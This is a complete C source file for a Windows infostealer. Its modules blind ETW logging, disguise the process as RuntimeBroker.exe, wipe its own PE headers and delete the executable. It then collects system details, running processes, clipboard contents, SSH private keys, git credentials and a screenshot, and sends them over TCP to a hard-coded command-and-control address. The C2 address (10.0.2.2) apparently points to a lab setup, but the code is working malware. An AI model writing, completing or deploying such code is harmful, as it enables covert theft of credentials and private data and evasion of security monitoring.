#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <tlhelp32.h>
#include <shlobj.h>



/* ── evasion/etw_patch ── */
static int patch_etw(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    void *targets[] = {
        GetProcAddress(ntdll, "EtwEventWrite"),
        GetProcAddress(ntdll, "EtwEventWriteFull"),
    };

    for (int i = 0; i < 2; i++) {
        unsigned char *addr = (unsigned char *)targets[i];
        if (!addr) continue;

        DWORD old;
        if (!VirtualProtect(addr, 3, PAGE_EXECUTE_READWRITE, &old))
            continue;

        addr[0] = 0x33; // xor eax, eax
        addr[1] = 0xC0;
        addr[2] = 0xC3; // ret
        VirtualProtect(addr, 3, old, &old);
    }
    return 1;
}


/* ── evasion/process_masquerade ── */
typedef struct _PM_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} PM_UNICODE_STRING;

static void masquerade_process(void) {
    static WCHAR fake_path[] = L"C:\\Windows\\System32\\RuntimeBroker.exe";
    static WCHAR fake_cmd[]  = L"C:\\Windows\\System32\\RuntimeBroker.exe -Embedding";

#ifdef _WIN64
    PVOID peb = (PVOID)__readgsqword(0x60);
    PVOID params = *(PVOID *)((BYTE *)peb + 0x20);
    PM_UNICODE_STRING *imgPath = (PM_UNICODE_STRING *)((BYTE *)params + 0x60);
    PM_UNICODE_STRING *cmdLine = (PM_UNICODE_STRING *)((BYTE *)params + 0x70);
#else
    PVOID peb = (PVOID)__readfsdword(0x30);
    PVOID params = *(PVOID *)((BYTE *)peb + 0x10);
    PM_UNICODE_STRING *imgPath = (PM_UNICODE_STRING *)((BYTE *)params + 0x38);
    PM_UNICODE_STRING *cmdLine = (PM_UNICODE_STRING *)((BYTE *)params + 0x40);
#endif

    imgPath->Buffer = fake_path;
    imgPath->Length = (USHORT)(wcslen(fake_path) * sizeof(WCHAR));
    imgPath->MaximumLength = imgPath->Length + sizeof(WCHAR);

    cmdLine->Buffer = fake_cmd;
    cmdLine->Length = (USHORT)(wcslen(fake_cmd) * sizeof(WCHAR));
    cmdLine->MaximumLength = cmdLine->Length + sizeof(WCHAR);
}


/* ── evasion/header_stomp ── */
static void stomp_pe_headers(void) {
    PVOID base = (PVOID)GetModuleHandleA(NULL);
    if (!base) return;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE *)base + dos->e_lfanew);
    DWORD headers_size = nt->OptionalHeader.SizeOfHeaders;

    DWORD old;
    if (VirtualProtect(base, headers_size, PAGE_READWRITE, &old)) {
        SecureZeroMemory(base, headers_size);
        VirtualProtect(base, headers_size, old, &old);
    }
}


/* ── evasion/self_delete ── */
typedef struct { ULONG_PTR i1; ULONG_PTR i2; union { struct { DWORD o; DWORD oh; }; PVOID p; }; HANDLE h; } SD_IOSB;
typedef LONG (NTAPI *pfnNtSetInfo)(HANDLE, SD_IOSB*, PVOID, ULONG, ULONG);

static void self_delete(void) {
    WCHAR path[MAX_PATH];
    if (!GetModuleFileNameW(NULL, path, MAX_PATH)) return;

    pfnNtSetInfo NtSet = (pfnNtSetInfo)
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationFile");
    if (!NtSet) return;

    struct {
        BOOLEAN ReplaceIfExists;
        HANDLE RootDirectory;
        ULONG FileNameLength;
        WCHAR FileName[16];
    } ri;
    memset(&ri, 0, sizeof(ri));
    ri.ReplaceIfExists = FALSE;
    ri.RootDirectory = NULL;
    ri.FileName[0] = L':';
    ri.FileName[1] = L'D';
    ri.FileName[2] = L'E';
    ri.FileName[3] = L'A';
    ri.FileName[4] = L'D';
    ri.FileName[5] = L'\0';
    ri.FileNameLength = 4 * sizeof(WCHAR);

    for (int attempt = 0; attempt < 5; attempt++) {
        HANDLE hFile = CreateFileW(path, DELETE | SYNCHRONIZE,
            FILE_SHARE_READ | FILE_SHARE_DELETE, NULL,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) {
            Sleep(500);
            continue;
        }

        SD_IOSB iosb;
        memset(&iosb, 0, sizeof(iosb));
        LONG s = NtSet(hFile, &iosb, &ri, sizeof(ri), 10);
        CloseHandle(hFile);

        if (s != 0) {
            Sleep(500);
            continue;
        }

        hFile = CreateFileW(path, DELETE | SYNCHRONIZE,
            FILE_SHARE_READ | FILE_SHARE_DELETE, NULL,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile == INVALID_HANDLE_VALUE) break;

        struct { ULONG Flags; } di;
        di.Flags = 0x03;
        memset(&iosb, 0, sizeof(iosb));
        NtSet(hFile, &iosb, &di, sizeof(di), 64);
        CloseHandle(hFile);
        break;
    }
}


/* ── evasion/behavioral_pacing ── */
static volatile DWORD g_sink = 0;

static void pace(DWORD base_ms, DWORD jitter_ms) {
    DWORD actual = base_ms + (GetTickCount() % (jitter_ms + 1));
    LARGE_INTEGER freq, t0, t1;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&t0);
    for (;;) {
        QueryPerformanceCounter(&t1);
        if ((DWORD)((t1.QuadPart - t0.QuadPart) * 1000 / freq.QuadPart) >= actual) break;
        SwitchToThread();
    }
}

static void decoy_work(void) {
    POINT pt; GetCursorPos(&pt);
    g_sink += pt.x + pt.y;
    HWND dw = GetDesktopWindow();
    RECT rc; GetWindowRect(dw, &rc);
    g_sink += rc.right + rc.bottom;
    g_sink += GetTickCount();
}


/* ── core/emit_buffer ── */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <windows.h>

#define COLLECT_BUF (1024 * 1024)

static char *g_data = NULL;
static DWORD g_pos = 0;
static DWORD g_cap = 0;

static void init_buffer(void) {
    g_data = (char *)malloc(COLLECT_BUF);
    if (g_data) g_cap = COLLECT_BUF;
    g_pos = 0;
}

static void emit(const char *d, DWORD n) {
    if (!g_data) return;
    if (g_pos + n >= g_cap) {
        DWORD need = g_pos + n + (256 * 1024);
        char *re = (char *)realloc(g_data, need);
        if (!re) return;
        g_data = re;
        g_cap = need;
    }
    memcpy(g_data + g_pos, d, n);
    g_pos += n;
}

static void emitf(const char *fmt, ...) {
    char tmp[4096];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(tmp, sizeof(tmp), fmt, ap);
    va_end(ap);
    if (n > 0) emit(tmp, (DWORD)n);
}


/* ── core/file_ops ── */
static int file_exists(const char *path) {
    return GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES;
}

static void emit_file(const char *path, DWORD max_sz) {
    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                           NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    DWORD sz = GetFileSize(h, NULL);
    if (sz == 0 || sz > max_sz) { CloseHandle(h); return; }
    BYTE *buf = (BYTE *)malloc(sz);
    if (buf) {
        DWORD rd;
        if (ReadFile(h, buf, sz, &rd, NULL) && rd > 0)
            emit((const char *)buf, rd);
        free(buf);
    }
    CloseHandle(h);
}

static void grab_file(const char *src, const char *tag, DWORD max_sz) {
    char temp[MAX_PATH];
    GetTempPathA(MAX_PATH, temp);
    char dst[MAX_PATH];
    snprintf(dst, MAX_PATH, "%s\\~%lx.tmp", temp, GetTickCount());
    if (CopyFileA(src, dst, FALSE)) {
        HANDLE hc = CreateFileA(dst, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        DWORD fsz = (hc != INVALID_HANDLE_VALUE) ? GetFileSize(hc, NULL) : 0;
        if (hc != INVALID_HANDLE_VALUE) CloseHandle(hc);
        emitf("  [%s] %lu bytes\r\n", tag, (unsigned long)fsz);
        emit_file(dst, max_sz);
        DeleteFileA(dst);
    }
}


/* ── collectors/system_info_api ── */
static void collect_system_info(void) {
    emitf("=== SYSTEM INFO ===\r\n");

    char hostname[256] = {0};
    DWORD hlen = sizeof(hostname);
    if (GetComputerNameA(hostname, &hlen))
        emitf("Hostname: %s\r\n", hostname);

    char *user = getenv("USERNAME");
    if (user) emitf("Username: %s\r\n", user);

    OSVERSIONINFOA ov;
    ZeroMemory(&ov, sizeof(ov));
    ov.dwOSVersionInfoSize = sizeof(ov);
    GetVersionExA(&ov);
    emitf("OS: Windows %lu.%lu Build %lu\r\n",
          ov.dwMajorVersion, ov.dwMinorVersion, ov.dwBuildNumber);

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    emitf("Arch: %s  CPUs: %lu\r\n",
          si.wProcessorArchitecture == 9 ? "x64" :
          si.wProcessorArchitecture == 12 ? "ARM64" : "x86",
          si.dwNumberOfProcessors);

    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    if (GlobalMemoryStatusEx(&ms))
        emitf("RAM: %llu MB\r\n", ms.ullTotalPhys / (1024 * 1024));

    emitf("\r\n");
}


/* ── collectors/processes ── */
#include <tlhelp32.h>

static void collect_processes(void) {
    emitf("=== RUNNING PROCESSES ===\r\n");
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) {
        do {
            emitf("  [%5lu] %s\r\n", pe.th32ProcessID, pe.szExeFile);
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    emitf("\r\n");
}


/* ── collectors/clipboard ── */
static void collect_clipboard(void) {
    if (!OpenClipboard(NULL)) return;
    HANDLE h = GetClipboardData(CF_TEXT);
    if (h) {
        char *txt = (char *)GlobalLock(h);
        if (txt && txt[0]) {
            emitf("=== CLIPBOARD ===\r\n");
            int len = (int)strlen(txt);
            emitf("%.*s\r\n\r\n", len > 4096 ? 4096 : len, txt);
        }
        GlobalUnlock(h);
    }
    CloseClipboard();
}


/* ── collectors/drives ── */
static void collect_drives(void) {
    emitf("=== LOGICAL DRIVES ===\r\n");
    char buf[256] = {0};
    DWORD len = GetLogicalDriveStringsA(sizeof(buf), buf);
    if (len == 0) { emitf("(none)\r\n\r\n"); return; }

    char *p = buf;
    while (*p) {
        UINT dt = GetDriveTypeA(p);
        const char *type;
        switch (dt) {
            case DRIVE_REMOVABLE: type = "Removable"; break;
            case DRIVE_FIXED:     type = "Fixed";     break;
            case DRIVE_REMOTE:    type = "Network";   break;
            case DRIVE_CDROM:     type = "CD-ROM";    break;
            case DRIVE_RAMDISK:   type = "RAMDisk";   break;
            default:              type = "Unknown";   break;
        }

        ULARGE_INTEGER free_bytes, total_bytes;
        if (GetDiskFreeSpaceExA(p, NULL, &total_bytes, &free_bytes)) {
            emitf("  %s  %-10s  Total: %llu GB  Free: %llu GB\r\n",
                  p, type,
                  total_bytes.QuadPart / (1024ULL*1024*1024),
                  free_bytes.QuadPart / (1024ULL*1024*1024));
        } else {
            emitf("  %s  %-10s\r\n", p, type);
        }
        p += strlen(p) + 1;
    }
    emitf("\r\n");
}


/* ── collectors/ssh_keys ── */
#include <shlobj.h>

static void collect_ssh_git(void) {
    char home[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, home) != S_OK) return;

    char ssh_dir[MAX_PATH];
    snprintf(ssh_dir, MAX_PATH, "%s\\.ssh", home);
    if (file_exists(ssh_dir)) {
        emitf("=== SSH KEYS ===\r\n");
        const char *key_files[] = {"id_rsa", "id_ed25519", "id_ecdsa", "id_dsa", "config", "known_hosts"};
        for (int i = 0; i < 6; i++) {
            char kp[MAX_PATH];
            snprintf(kp, MAX_PATH, "%s\\%s", ssh_dir, key_files[i]);
            if (file_exists(kp)) {
                emitf("[%s]\r\n", key_files[i]);
                emit_file(kp, 256*1024);
                emitf("\r\n");
            }
        }
        emitf("\r\n");
    }

    char git_cred[MAX_PATH];
    snprintf(git_cred, MAX_PATH, "%s\\.git-credentials", home);
    if (file_exists(git_cred)) {
        emitf("=== GIT CREDENTIALS ===\r\n");
        emit_file(git_cred, 256*1024);
        emitf("\r\n\r\n");
    }
}


/* ── collectors/screenshot ── */
static void collect_screenshot(void) {
    HDC hScreen = GetDC(NULL);
    if (!hScreen) return;
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HDC hMem = CreateCompatibleDC(hScreen);
    HBITMAP hBmp = CreateCompatibleBitmap(hScreen, w, h);
    SelectObject(hMem, hBmp);
    BitBlt(hMem, 0, 0, w, h, hScreen, 0, 0, SRCCOPY);

    BITMAPINFOHEADER bi = {0};
    bi.biSize = sizeof(bi);
    bi.biWidth = w;
    bi.biHeight = -h;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;
    DWORD row = ((w * 3 + 3) & ~3);
    DWORD img_sz = row * h;

    BYTE *pixels = (BYTE *)malloc(img_sz);
    if (pixels) {
        GetDIBits(hMem, hBmp, 0, h, pixels, (BITMAPINFO *)&bi, DIB_RGB_COLORS);

        /* Skip if screen is blank (all black = no desktop session) */
        int blank = 1;
        for (DWORD i = 0; i < img_sz && blank; i += row) {
            for (int x = 0; x < w * 3 && blank; x++) {
                if (pixels[i + x] != 0) blank = 0;
            }
        }

        if (!blank) {
            BITMAPFILEHEADER bf = {0};
            bf.bfType = 0x4D42;
            bf.bfSize = sizeof(bf) + sizeof(bi) + img_sz;
            bf.bfOffBits = sizeof(bf) + sizeof(bi);

            emitf("=== SCREENSHOT ===\r\n");
            emitf("  %dx%d BMP (%lu bytes)\r\n", w, h, bf.bfSize);
            emit((const char *)&bf, sizeof(bf));
            emit((const char *)&bi, sizeof(bi));
            emit((const char *)pixels, img_sz);
            emitf("\r\n");
        } else {
            emitf("=== SCREENSHOT ===\r\n");
            emitf("  (skipped: no desktop session)\r\n");
        }
        free(pixels);
    }

    DeleteObject(hBmp);
    DeleteDC(hMem);
    ReleaseDC(NULL, hScreen);
}


/* ── exfil/tcp_direct ── */
#include <winsock2.h>
#include <ws2tcpip.h>

#define C2_ADDR "10.0.2.2"
#define C2_PORT 9001

static BOOL exfiltrate(const char *ip, WORD port, const char *data, DWORD len) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return FALSE;
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) { WSACleanup(); return FALSE; }

    struct sockaddr_in addr;
    ZeroMemory(&addr, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);

    int retries = 3;
    while (retries-- > 0) {
        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) != SOCKET_ERROR)
            break;
        if (retries > 0) { closesocket(sock); Sleep(2000);
            sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (sock == INVALID_SOCKET) { WSACleanup(); return FALSE; }
        } else { closesocket(sock); WSACleanup(); return FALSE; }
    }

    DWORD sent = 0;
    while (sent < len) {
        int n = send(sock, data + sent, (len - sent > 32768) ? 32768 : len - sent, 0);
        if (n <= 0) break;
        sent += n;
    }
    closesocket(sock);
    WSACleanup();
    return sent == len;
}


/* ── arch/sequential ── */
int main(int argc, char *argv[]) {
    (void)argc; (void)argv;
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
    patch_etw();
    masquerade_process();
    stomp_pe_headers();
    self_delete();

    init_buffer();
    if (!g_data) return 1;

        collect_system_info();
    collect_processes();
    collect_clipboard();
    collect_drives();
    collect_ssh_git();
    collect_screenshot();

    if (g_pos > 0)
        exfiltrate(C2_ADDR, C2_PORT, g_data, g_pos);

    free(g_data);
    return 0;
}


